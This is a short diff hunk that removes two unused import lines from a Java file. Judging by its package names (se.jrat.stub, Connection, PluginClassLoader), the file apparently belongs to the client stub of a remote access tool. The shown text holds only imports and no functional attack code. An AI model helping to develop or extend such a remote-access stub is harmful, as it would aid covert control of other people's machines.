@@ -6,10 +6,8 @@ import java.util.jar.JarFile;
 import java.util.jar.JarInputStream;
 
 import se.jrat.common.Logger;
-import se.jrat.common.io.FileIO;
 import se.jrat.common.utils.JarUtils;
 import se.jrat.stub.Connection;
-import se.jrat.stub.Main;
 import se.jrat.stub.Plugin;
 import se.jrat.stub.PluginClassLoader;
 import se.jrat.stub.packets.Temp;
